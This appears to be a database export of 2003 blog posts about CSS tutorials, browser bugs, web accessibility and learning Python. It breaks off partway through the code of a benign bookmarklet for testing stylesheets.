		<field name="body">&lt;p&gt;If the 309 buttons at &lt;a href=&quot;http://gtmcknight.com/buttons.html&quot;&gt;Steal these buttons&lt;/a&gt; aren't enough for you, you can now &lt;a href=&quot;http://www.minimalverbosity.com/2003/May/19/buttons.htm&quot; title=&quot;buttons&quot;&gt;generate your own&lt;/a&gt; thanks to a clever &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; script on Minimal Verbosity. Bill Zeller has made the &lt;a href=&quot;http://www.minimalverbosity.com/button.phps&quot; title=&quot;button.phps&quot;&gt;source code&lt;/a&gt; available as well.&lt;/p&gt;</field>
		<field name="created">2003-05-23 13:58:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">983</field>
		<field name="title">Learning Python, second edition</field>
		<field name="slug">lp2e</field>
		<field name="body">&lt;p&gt;Mark Lutz has &lt;a href=&quot;http://rmi.net/~lutz/whatsnew.html#S63&quot; title=&quot;LP2E project underway&quot;&gt;announced&lt;/a&gt; that he is working on a second edition of &lt;a href=&quot;http://rmi.net/~lutz/about-lp.html&quot;&gt;Learning Python&lt;/a&gt;. The first edition of Learning Python is probably the best learn-programming-language-X title I have ever read. It's nice and short, but covers the whole core Python language comprehensively with excellent examples and a well targetted learning curve. I've lent my copy to several people, all of whom found it very helpful and one of whom went on to buy a copy themselves. I'll probably be buying a copy of the second edition just so I can use it on my constant mission to get more people on my course to give Python a go.&lt;/p&gt;</field>
		<field name="created">2003-05-23 14:03:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">984</field>
		<field name="title">Browser bug swatting</field>
		<field name="slug">browserBugSwatting</field>
		<field name="body">&lt;p&gt;Craig Saila: &lt;a href=&quot;http://www.saila.com/columns/rants/030523.shtml&quot;&gt;Browser bug swatting&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.saila.com/columns/rants/030523.shtml&quot;&gt;
&lt;p&gt;I've decided it's time to start actively pushing for the browser makers to fix some really annoying CSS bugs. In day-to-day development, I find myself continually creating clumsy workarounds because a browser doesn't support five-year-old standards. Already I've filed some with Opera, and Mozilla, and am now pushing on Internet Explorer.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Craig includes the 5 key problems with Internet Explorer 6's &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; support and suggests you join him in submitting feedback to Microsoft requesting they hurry up and add them. The sooner they fix them the better, as it'll probably be another few years from then before &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5 and 6 lose enough market share for these features to be usable in the wild.&lt;/p&gt;
</field>
		<field name="created">2003-05-23 18:22:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">985</field>
		<field name="title">CSS Tutorial: feedback so far</field>
		<field name="slug">tutorialFeedback</field>
		<field name="body">&lt;p&gt;My &lt;a href=&quot;http://simon.incutio.com/categories/csstutorial/&quot; title=&quot;CSS ain&amp;apos;t Rocket Science&quot;&gt;CSS tutorial series&lt;/a&gt; has been getting some fantastic feedback, both in this blog's comments system and elsewhere. This entry will summarise the most useful feedback, acting as a kind of errata to the previous entries. Thanks to everyone who commented, there are too many to credit individually but you can see most of the points in their original format by browsing the comments attached to each entry.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://simon.incutio.com/archive/2003/05/18/anatomyOfAStylesheet&quot;&gt;The anatomy of a stylesheet&lt;/a&gt;&lt;/h4&gt;

&lt;ol&gt;
 &lt;li&gt;In one of the examples I specified a &lt;code class=&quot;css&quot;&gt;color&lt;/code&gt; property without a &lt;code class=&quot;css&quot;&gt;background-color&lt;/code&gt; property. This causes a warning when run through the &lt;a href=&quot;http://jigsaw.w3.org/css-validator/&quot;&gt;CSS validator&lt;/a&gt;, because it may lead to unreadable text if the user has configured their browser's user stylesheet in such a way that your applied colour becomes unreadable.&lt;/li&gt;
 &lt;li&gt;I failed to cover the &lt;dfn&gt;Universal Selector&lt;/dfn&gt;. This is an &lt;code class=&quot;css&quot;&gt;*&lt;/code&gt; in place of the element selector, and means &quot;any element&quot;. In fact, &lt;code class=&quot;css&quot;&gt;.classname&lt;/code&gt; and &lt;code class=&quot;css&quot;&gt;#idname&lt;/code&gt; are actually shorthands for &lt;code class=&quot;css&quot;&gt;*.classname&lt;/code&gt; and &lt;code class=&quot;css&quot;&gt;*#idname&lt;/code&gt;.&lt;/li&gt;
 &lt;li&gt;A couple of terminology points: &quot;internal stylesheets&quot; are better known as &quot;embedded stylesheets&quot; and the &quot;descendant selector&quot; is really called the &quot;descendant combinator&quot;.&lt;/li&gt;
 &lt;li&gt;&lt;code class=&quot;css&quot;&gt;div#main a:link&lt;/code&gt; is preferable to &lt;code class=&quot;css&quot;&gt;div#main a&lt;/code&gt; for selecting all links inside a specific div, as it will match only hyperlinks while &lt;code class=&quot;css&quot;&gt;div#main a&lt;/code&gt; would match &lt;code class=&quot;html&quot;&gt;&amp;lt;a name=&quot;anchor&quot;&amp;gt;&lt;/code&gt; points as well.&lt;/li&gt;
&lt;/ol&gt;

&lt;h4&gt;&lt;a href=&quot;http://simon.incutio.com/archive/2003/05/19/scriptingWithCSS&quot;&gt;Scripting.com, with added CSS&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;This entry drew the greatest criticism for its extensive use of the Fahrner Image Replacement technique, which &lt;a href=&quot;http://stopdesign.com/articles/css/replace-text/#footnote1&quot; title=&quot;Footnote to Doug Bowman&amp;apos;s &amp;quot;Using Background-Image to Replace Text&amp;quot;&quot;&gt;can cause accessibility problems&lt;/a&gt; and also has some browser compatibility problems. In particular, the purple permalink icons were not showing up in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;5/Mac, probably because the technique was being applied to an inline rather than a block-level element. I have prepared two alternative examples of the Scripting.com remake, one using a permalink image and one that uses &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; to style the '#' sign to appear small and purple: &lt;a href=&quot;/code/css/scripting/finished-hashimages.html&quot;&gt;Scripting.com with inline image permalinks&lt;/a&gt;, &lt;a href=&quot;/code/css/scripting/finished-hashstyles.html&quot;&gt;Scripting.com with styled purple hashes&lt;/a&gt;.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://simon.incutio.com/archive/2003/05/20/defeatingIE5#comments&quot;&gt;Defeating IE5 CSS bugs with the help of jwz&lt;/a&gt;&lt;/h4&gt;

&lt;ol&gt;
 &lt;li&gt;Owen Brigg's &lt;a href=&quot;http://www.thenoodleincident.com/tutorials/typography/index.html&quot;&gt;Sane CSS text sizes&lt;/a&gt; was suggested as a useful text sizing tutorial.&lt;/li&gt;
 &lt;li&gt;Vincent Flanders commented that the teaching style of the course sacrificed instant availability of code for extensive explanations, when most people would probably just like to grab the code and run. The reason I'm explaining everything as I go along is that the hey to using &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; in a practical manner is to understand its limitations and the subtle browser bugs demonstrated by some modern browsers. Just providing code may teach people basic &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; faster, but the moment they try their site in IE5 they'll be stumped by the weird side effects. By explaining each workaround as and when I use it I hope to make the unpleasant surprises a bit less unpleasant.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://randomfoo.net/?p=2003_04_27_archive.inc&quot;&gt;Leonard Lin&lt;/a&gt; (broken permalink, try the front page) commented that this article essentially proved jwz right in that &quot;CSS is too fuckin' hard&quot;. He's got a fair point, but I believe that for more people to successfully adopt &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; they need to be fully exposed to it, warts and all. The jwz example shows off &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; at its worst, but despite the hacks the result is still smaller, more structural and more maintainable than the original. Designs without centered blocks or using a font other than verdana would have avoided the hacks entirely.&lt;/li&gt;
&lt;/ol&gt;

&lt;h4&gt;&lt;a href=&quot;http://simon.incutio.com/archive/2003/05/21/stylingBlockquotes&quot;&gt;Quick tip: Styling blockquotes with CSS&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;Most of the comments here involved alternative ways of applying the selectors, all of which are worth reading about but none of which are practical due to poor browser support. I recommend reading them anyway, as they give a good indication of how much cleaner &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; will be once Microsoft &lt;a href=&quot;http://www.saila.com/columns/rants/030523.shtml&quot; title=&quot;Browser bug swatting&quot;&gt;get their act together&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-05-23 23:59:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">986</field>
		<field name="title">Understanding the Box Model</field>
		<field name="slug">theBoxModel</field>
		<field name="body">&lt;p&gt;Today's tutorial is going to be all theory. The box model is an inevitable part of CSS, and understanding it is critical if you want to do anything remotely interesting. Like most of CSS, it's a lot simpler than it sounds. Here it is:&lt;/p&gt;

&lt;p class=&quot;img&quot;&gt;&lt;img alt=&quot;The box model governs the way margins, padding and borders are applied to block level elements&quot; height=&quot;284&quot; src=&quot;http://simon.incutio.com/images/2003/boxmodel.gif&quot; width=&quot;492&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before discussing the box model, it is important to understand the difference between &lt;dfn&gt;inline&lt;/dfn&gt; and &lt;dfn&gt;block level&lt;/dfn&gt; elements. Inline elements are things like links, &lt;code class=&quot;html&quot;&gt;&amp;lt;em&amp;gt;&lt;/code&gt;s and &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt;s - any element that appears &quot;inline&quot; in a piece of text without inserting any newlines. Block level elements on the other hand always start on a new line and cause any content following them to start on a new line as well. They include things like &lt;code class=&quot;html&quot;&gt;&amp;lt;p&amp;gt;&lt;/code&gt;, &lt;code class=&quot;html&quot;&gt;&amp;lt;div&amp;gt;&lt;/code&gt; and the various header tags. Block level elements can contain both block level and inline elements, but inline elements can only contain other inline elements. An inline element can be &quot;promoted&quot; to behave like a block level element using the &lt;code class=&quot;css&quot;&gt;display: block;&lt;/code&gt; property, and the reverse can be achieved using &lt;code class=&quot;css&quot;&gt;display: inline;&lt;/code&gt; - note however that doing this does not change the rules about what kind of elements something can contain. The box model principally applies to block level elements (although some of it works with inline elements as well).&lt;/p&gt;

&lt;p&gt;As you can see from the diagram, the box model deals with the width, margin, padding and border around an element. You can specify a width using the &lt;code class=&quot;css&quot;&gt;width&lt;/code&gt; property; width can be specified in pixels, ems or percentages (and other units as well but these are the most common) and applies to the area on the diagram labelled &quot;content area&quot;. It should be noted that the overall width of the box up to the borders (the dark grey area on the diagram) is actually the width, plus the left padding, plus the right padding, plus the width of the left and right borders.&lt;/p&gt;

&lt;p&gt;It is here that IE5 gets things wrong: in IE5, the width property applies to the width AND the padding AND the border. There are two solutions to this problem. The first is to use Tantek's &lt;a href=&quot;http://www.tantek.com/CSS/Examples/boxmodelhack.html&quot;&gt;box model hack&lt;/a&gt; to feed alternative width values to IE5 (we have used this previously to improve IE5's rendering of Verdana). The second is to avoid setting any padding or thick borders on blocks that have a width declared, instead relying on the margin of elements contained within that block to add the &lt;em&gt;illusion&lt;/em&gt; of padding. Which technique you use it up to you.&lt;/p&gt;

&lt;p&gt;Margins, borders and padding can be set separately for each side, or set all at once using shorthand properties.&lt;/p&gt;

&lt;p&gt;An important thing to understand is the difference between margin and padding. Obviously padding occurs inside the border and margin outside, but surely this means that either can be used to the same effect if no border is required. This is more or less true, but comes with a few caveats. Firstly, the area treated by elements nested within an element as the &quot;width&quot; of the element is the content area plus the padding - this becomes important later on when we start to look at positioning. Secondly, top and bottom margins have a special effect applied to them called margin collapse. Put simply, when two elements are positioned above and below each other the gap between them is the size of the largest margin, NOT the size of the combined margins. This becomes important when considering margins on paragraphs, where specifying a margin of 1em means you get a 1em gap between each paragraph, rather than 2ems due to the margins being added together.&lt;/p&gt;</field>
		<field name="created">2003-05-26 23:58:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">987</field>
		<field name="title">Fun with links</field>
		<field name="slug">funWithLinks</field>
		<field name="body">&lt;p&gt;Yesterday we talked about the box model. Today we're going to put a small part of it to work, by investigating ways of styling links. Before getting stuck in, we need to talk a bit about &lt;dfn&gt;pseudo-selectors&lt;/dfn&gt; (also known as pseudo classes). The &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; specification defines pseudo classes as &quot;characteristics that cannot be deduced from the document tree&quot;, but in practise the only widely implemented psuedo selectors are those that apply to links. The key psuedo selectors for links are:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;code class=&quot;selector&quot;&gt;a:link&lt;/code&gt; applies to normal links (but not to &lt;code class=&quot;html&quot;&gt;&amp;lt;a name=&quot;&quot;&amp;gt;&lt;/code&gt; elements)&lt;/li&gt;
 &lt;li&gt;&lt;code class=&quot;selector&quot;&gt;a:visited&lt;/code&gt; applies to visited links&lt;/li&gt;
 &lt;li&gt;&lt;code class=&quot;selector&quot;&gt;a:active&lt;/code&gt; applies to active links (links that are currently being clicked on)&lt;/li&gt;
 &lt;li&gt;&lt;code class=&quot;selector&quot;&gt;a:hover&lt;/code&gt; applies to links that the mouse is currently positioned over&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It is the last of these that we shall be focusing on. One of the first and most popular effects that emerged when Javascript became popular was the image rollover, where an image (generally used as part of a site's navigation) would change when the mouse was positioned over it. &lt;code class=&quot;selector&quot;&gt;a:hover&lt;/code&gt; allows us to achieve a similar effect using just &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. The most striking change is to alter the background colour, as shown in &lt;a href=&quot;/code/css/links/basic.html&quot; title=&quot;Simple link example&quot;&gt;this example&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;After yesterday's discussion of the box model, it seems we would be able to achieve a lot more with this effect if links were block level elements. We can use the &lt;code class=&quot;css&quot;&gt;display: block;&lt;/code&gt; property to &quot;promote&quot; a link to block level status, which allows us to achieve all kinds of groovy effects. Consider the following &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;div id=&quot;menu&quot;&amp;gt;
 &amp;lt;a href=&quot;/&quot;&amp;gt;Link 1&amp;lt;/a&amp;gt;
 &amp;lt;a href=&quot;/&quot;&amp;gt;Link 2&amp;lt;/a&amp;gt;
 &amp;lt;a href=&quot;/&quot;&amp;gt;Link 3&amp;lt;/a&amp;gt;
 &amp;lt;a href=&quot;/&quot;&amp;gt;Link 4&amp;lt;/a&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Left to its own devices, this would display as a rather uninteresting line of links. Add some &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and we can make it look much more interesting:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;div#menu {
  width: 5em;
  border: 1px solid red;
  border-bottom: none;
}

div#menu a {
  display: block;
  text-decoration: none;
  border-bottom: 1px solid red;
  background-color: white;
  color: red;
  padding: 0 0.2em;
}

div#menu a:hover {
  background-color: red;
  color: white;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A few things to note. Most importantly, the links inside the div are set to &lt;code class=&quot;css&quot;&gt;display: block&lt;/code&gt;. This causes them to &quot;stack up&quot; on top of each other, and also causes them to expand to be as wide as their containing box (which is why we have restricted its width to 5 ems). The menu border is set to 1px all the way round, but then the bottom border is turned off. This means that when we set a bottom border on the links themselves the very bottom link does not end up with a &lt;em&gt;double&lt;/em&gt; border. The result of the above &lt;a href=&quot;/code/css/links/block-level.html&quot; title=&quot;Block level links example&quot;&gt;can be seen here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;How about horizontal navigation? That can be achieved in a similar fashion, using the float property to position the links next to each other:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;div#menu a {
  display: block;
  float: left;
  width: 5em;
  padding: 0 0.2em;
  margin-right: 1em;
  text-decoration: none;
  border: 1px solid red;
  background-color: white;
  color: red;
}

div#menu a:hover {
  background-color: red;
  color: white;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Check out &lt;a href=&quot;/code/css/links/block-level-floats.html&quot; title=&quot;Block level floated links example&quot;&gt;the result here&lt;/a&gt;. Now that the links are floated it is important they have an explicit width assigned to them. A margin-right is used to place a gap between the links. There is one caveat to this method: It is important that any following element (preferably one that spans the whole page) as &lt;code class=&quot;css&quot;&gt;clear: both;&lt;/code&gt; applied to it, or any text in that element will flow around the menu rather than appearing below it. This is one of the most common upsets caused by using floats, and exactly the thing the clear property is designed to solve.&lt;/p&gt;

&lt;p&gt;There is one problem with the technique described so far: accessibility. If you run the above examples through any accessibility checker they will flag up a warning that the links in the examples are seperated only by whitespace. Try disabling &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; or viewing the examples in a non-&lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; browser and you'll see that this could definitely cause confusion - the links are displayed on a single line with only a single space between each one. A solution is at hand in the form of the humble &amp;lt;span&amp;gt; element accompanied by the &lt;code class=&quot;css&quot;&gt;display: none&lt;/code&gt; property:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;div#menu span {
  display: none;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;div id=&quot;menu&quot;&amp;gt;
 &amp;lt;a href=&quot;/&quot;&amp;gt;Link 1&amp;lt;/a&amp;gt;&amp;lt;span&amp;gt; | &amp;lt;/span&amp;gt;
 &amp;lt;a href=&quot;/&quot;&amp;gt;Link 2&amp;lt;/a&amp;gt;&amp;lt;span&amp;gt; | &amp;lt;/span&amp;gt;
 &amp;lt;a href=&quot;/&quot;&amp;gt;Link 3&amp;lt;/a&amp;gt;&amp;lt;span&amp;gt; | &amp;lt;/span&amp;gt;
 &amp;lt;a href=&quot;/&quot;&amp;gt;Link 4&amp;lt;/a&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here's a &lt;a href=&quot;/code/css/links/block-level-spans.html&quot; title=&quot;Block level floats with spans&quot;&gt;demonstration of the above&lt;/a&gt;. Note that it's identical to the previous example in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; browsers; the separating pipes only show up when the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; is not applied.&lt;/p&gt;</field>
		<field name="created">2003-05-27 23:58:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">988</field>
		<field name="title">Golden Mean</field>
		<field name="slug">goldenMean</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.csszengarden.com/?cssfile=017/017.css&amp;amp;page=0&quot;&gt;Golden Mean&lt;/a&gt; is Doug Bowman's first contribution to the &lt;a href=&quot;http://www.csszengarden.com/&quot;&gt;CSS Zen Garden&lt;/a&gt;, and it's a very nice piece of work. Even better is the fact that Doug has provided &lt;a href=&quot;http://www.stopdesign.com/log/default.asp?date=20030527&quot; title=&quot;In the Garden&quot;&gt;extensive coverage&lt;/a&gt; of the design process (including technical &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; details) on his blog.&lt;/p&gt;</field>
		<field name="created">2003-05-31 23:51:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">989</field>
		<field name="title">Infrequent updates</field>
		<field name="slug">infrequentUpdates</field>
		<field name="body">&lt;p&gt;My infrequent updates can be blamed on two things: revision for exams (three next week) and Grand Theft Auto: Vice City. One of these two has been taking up far more time than it should...&lt;/p&gt;</field>
		<field name="created">2003-05-31 23:55:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">990</field>
		<field name="title">Mouseless</field>
		<field name="slug">mouseless</field>
		<field name="body">&lt;p&gt;My mouse stopped working a couple of days ago. This hasn't ben as big a problem as you might have thought, mainly because Vice City refuses to install on my PC so I've been playing it on a housemates instead ;) Surfing the 'net mouseless has however given me an interesting insight in to a number of accessibility issues.&lt;/p&gt;

&lt;p&gt;Firstly, Flash just isn't accessible! I haven't found a single Flash site that I could even start to use without a mouse (most of the time I got stuck at a splash screen). Maybe if sites were built with Flash MX and used the much touted accessibility features I would have been able to navigate them, but as it was anything in Flash became utterly inaccessible to me.&lt;/p&gt;

&lt;p&gt;Secondly, Windows is a lot more obviously accessible to keyboard users than Gnome on Linux, thanks mainly to the Windows key providing access to the start menu. If anyone can tell me a way of accessing the launch menus in Gnome using only the keyboard I would be very grateful.&lt;/p&gt;

&lt;p&gt;Finally, &lt;a href=&quot;http://www.mozilla.org/projects/ui/accessibility/typeaheadfind.html&quot; title=&quot;Find As You Type&quot;&gt;Typeahead Find&lt;/a&gt; in Mozilla and Firebird is an absolute God-send. With it I can surf keyboardless at pretty much the same speed as I can with a mouse, provided of course I don't run in to any Flash. The only time it slips up a bit is on sites that use the same text for multiple links (for example the Comments links on this site), but even then it's easy enough to cycle through them using F3. This is supported by &lt;a href=&quot;http://www.w3.org/TR/WCAG10-HTML-TECHS/#link-text&quot; title=&quot;Techniques for Web Content Accessibility: 6.1 Link text&quot;&gt;this tip&lt;/a&gt; from the &lt;acronym title=&quot;Web Accessibility Initiative&quot;&gt;WAI&lt;/acronym&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.w3.org/TR/WCAG10-HTML-TECHS/#link-text&quot;&gt;&lt;p&gt;If more than one link on a page shares the same link text, all those links should point to the same resource. Such consistency will help page design as well as accessibility.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Incidentally, &lt;a href=&quot;http://www.w3.org/TR/WCAG10-HTML-TECHS/&quot;&gt;HTML Techniques for Web Content Accessibility Guidelines 1.0&lt;/a&gt;, despite being something of a mouthful, is a fantastic document if you are at all interested in web accessibility. It's full of useful tips for making content more accessible, including code examples for the impatient. As with all &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; documents you need to scroll past the extensive preamble and table of contents before you get to the juicy bits.&lt;/p&gt;</field>
		<field name="created">2003-06-01 11:57:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">991</field>
		<field name="title">From HTML to CSS</field>
		<field name="slug">htmlToCss</field>
		<field name="body">&lt;p&gt;Tom Gilder: &lt;a href=&quot;http://tom.me.uk/html-to-css/&quot;&gt;&quot;I did this in HTML, how do I do it in CSS?&quot;&lt;/a&gt;. A collection of tips for replicating visual formatting effects in old-style &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; with their &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; equivalents. A good resource for people just getting started with &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2003-06-01 14:07:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">992</field>
		<field name="title">Using bookmarklets to experiment with CSS</field>
		<field name="slug">bookmarkletsAndCSS</field>
		<field name="body">&lt;p&gt;I'm in the middle of a whole bunch of exams at the moment, but here's a quick tip that should make experimenting with and learning &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; a great deal easier. It involves bookmarklets. If you haven't seen them before, bookmarklets are bookmarks that embed javascript; when you click the bookmark, the javascript is executed in the context of the currently loaded page. What that means is that in a suitably advanced browser bookmarklets can be used to modify pages, analyse their structure and do a whole host of other useful things.&lt;/p&gt;

&lt;p&gt;A fair number of bookmarklets work in both &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; and Gecko engine browsers, but the really interesting ones (at least as far as learning &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; is concerned) tend to be Gecko only. If you're serious about learning &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; it's well worth getting a Gecko browser at any rate - Gecko's &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; support is more standards compliant than anything else currently available, so I recommend designing for the standards with Gecko and tweaking to support &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; afterwards. Some people advocate designing for IE because it has buggier support, but once you've seen the tools available for Gecko I think you'll agree it really is a superb development platform. If you don't have access to a Gecko engine browser (that means Mozilla, Netscape 7, Camino, or Phoenix/Firebird) go and grab &lt;a href=&quot;http://www.mozilla.org/projects/firebird/&quot; title=&quot;Mozilla Firebird Project&quot;&gt;Firebird&lt;/a&gt; - it's only a 6 &lt;acronym title=&quot;MegaByte&quot;&gt;MB&lt;/acronym&gt; download and is available for most major platforms.&lt;/p&gt;

&lt;p&gt;Now that you're tooled up with a good browser, drag the following links on to your links toolbar or add them as bookmarks:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;javascript:(function(){function init(){var newline=unescape(&amp;quot;%&amp;quot;+&amp;quot;0A&amp;quot;);dead=false;oldCSS=null;x=opener;ta=document.f.ta;ta.select();ta.value=&amp;quot;/* Type CSS rules here and they will be applied&amp;quot;+newline+&amp;quot;to pages from &amp;apos;&amp;quot;+location.host+&amp;quot;&amp;apos;&amp;quot;+newline+&amp;quot;immediately as long as you keep this window open. */&amp;quot;+newline+newline;update();}function update(){try{if(!x||x.closed){ta.style.backgroundColor=&amp;quot;#ddd&amp;quot;;return;}x.bookmarkletStyleSheet;}catch(er){ta.style.backgroundColor=&amp;quot;#fdc&amp;quot;;setTimeout(update,150);dead=true;return;}if(dead){dead=false;ta.style.backgroundColor=&amp;quot;&amp;quot;;oldCSS=null;}if(!x.testStyles){var newSS;newSS=x.document.createElement(&amp;quot;link&amp;quot;);newSS.rel=&amp;quot;stylesheet&amp;quot;;newSS.type=&amp;quot;text/css&amp;quot;;x.document.getElementsByTagName(&amp;quot;head&amp;quot;)[0].appendChild(newSS);x.testStyles=newSS;oldCSS=null;}if(oldCSS!=ta.value){oldCSS=ta.value;if(window.opera)x.testStyles.href=&amp;quot;javascript:unescape(&amp;apos;&amp;quot;+escape(ta.value)+&amp;quot;&amp;apos;)&amp;quot;;else if(navigator.userAgent.indexOf(&amp;quot;MSIE&amp;quot;)!=-1)x.testStyles.href=&amp;quot;javascript:unescape(&amp;apos;&amp;quot;+escape(escape(ta.value))+&amp;quot;&amp;apos;)&amp;quot;;else x.testStyles.href=&amp;quot;data:text/css,&amp;quot;+escape(ta.value);}setTimeout(update,150);}y=window.open(&amp;apos;&amp;apos;,&amp;apos;&amp;apos;,&amp;apos;resizable,width=500,height=300&amp;apos;);y.document.write(&amp;apos;&amp;lt;title&amp;gt;New CSS Style Sheet&amp;lt;/title&amp;gt;&amp;lt;style&amp;gt;.ec { width: 100%; height: 100%; border: none; margin: 0px; padding: 0px; }&amp;lt;/style&amp;gt;&amp;lt;body class=&amp;quot;ec&amp;quot;&amp;gt;&amp;lt;form name=&amp;quot;f&amp;quot; style=&amp;quot;margin: 0px;&amp;quot; class=&amp;quot;ec&amp;quot;&amp;gt;&amp;lt;textarea name=&amp;quot;ta&amp;quot; wrap=&amp;quot;soft&amp;quot; style=&amp;quot;margin: 0px; border: 0px; width:100%; height:100%;&amp;quot; class=&amp;quot;ec&amp;quot;&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;&amp;apos;+update+init+&amp;apos;init();&amp;lt;&amp;apos;+&amp;apos;/script&amp;gt;&amp;apos;);y.document.close();})()&quot;&gt;test styles&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;javascript:(function(){function init(){var newline=unescape(&amp;quot;%&amp;quot;+&amp;quot;0A&amp;quot;),importCount=0,L=[];dead=false;oldCSS=null;x=opener;ta=document.f.ta;ta.select();if(x.editStyles){ta.value=x.editStyles.innerHTML;update();return;}ta.value=&amp;quot;/* Type CSS rules here and they will be applied&amp;quot;+newline+&amp;quot;to pages from &amp;apos;&amp;quot;+location.host+&amp;quot;&amp;apos;&amp;quot;+newline+&amp;quot;immediately as long as you keep this window open. */&amp;quot;+newline+newline;function add(s){if(!s.disabled){var y={sheet:s,readable:true,label:&amp;quot;Imported&amp;quot;,inline:false,shorturl:&amp;quot;&amp;quot;,fulltext:&amp;quot;&amp;quot;};try{for(var k=0,m;m=s.cssRules[k];++k)if(m.type==3)add(m.styleSheet);}catch(er){y.readable=false;}L.push(y);if(s.ownerNode){y.label=s.ownerNode.tagName.toUpperCase()+&amp;quot;-tag&amp;quot;;if(!s.ownerNode.getAttribute(&amp;quot;src&amp;quot;)&amp;amp;&amp;amp;!s.ownerNode.href)y.inline=true;}if(y.inline){y.label=&amp;quot;Inline &amp;quot;+y.label;y.fulltext=fix(s.ownerNode.innerHTML);}else if(s.href.substr(0,13)==&amp;quot;data:text/css&amp;quot;){y.shorturl=&amp;quot; contained in a data: URL&amp;quot;;y.fulltext=fix(unescape(s.href.slice(14)));}else{++importCount;y.importtext=&amp;quot;@import \&amp;quot;&amp;quot;+s.href+&amp;quot;\&amp;quot;;&amp;quot;;y.shorturl=&amp;quot; &amp;quot;+s.href.split(&amp;apos;/&amp;apos;).reverse()[0];if(!y.readable){y.fulltext=&amp;quot;/* Out-of-domain; imported above. */&amp;quot;;}else 